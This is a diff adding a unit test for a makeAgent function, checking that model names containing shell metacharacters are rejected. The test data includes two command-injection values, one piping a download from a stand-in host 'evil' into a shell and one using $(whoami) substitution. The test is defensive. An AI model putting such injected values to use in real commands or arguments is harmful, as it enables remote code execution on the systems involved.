@@ -18,6 +18,12 @@ describe('makeAgent', () => {
   test('opencode without :model throws', () => {
     expect(() => makeAgent('opencode', 'bob')).toThrow(/<handle>:<model>/);
   });
+  test('opencode model with shell metacharacters is rejected', () => {
+    expect(() => makeAgent('opencode', 'bob:x; curl evil|sh')).toThrow(/unsafe characters/);
+    expect(() => makeAgent('opencode', 'bob:$(whoami)')).toThrow(/unsafe characters/);
+    // a legitimate model with dots, slashes and a colon is still accepted
+    expect(makeAgent('opencode', 'bob:ollama/qwen2.5:7b').runArgv).toBe('opencode -m ollama/qwen2.5:7b');
+  });
 });
 
 describe('parseArgs', () => {
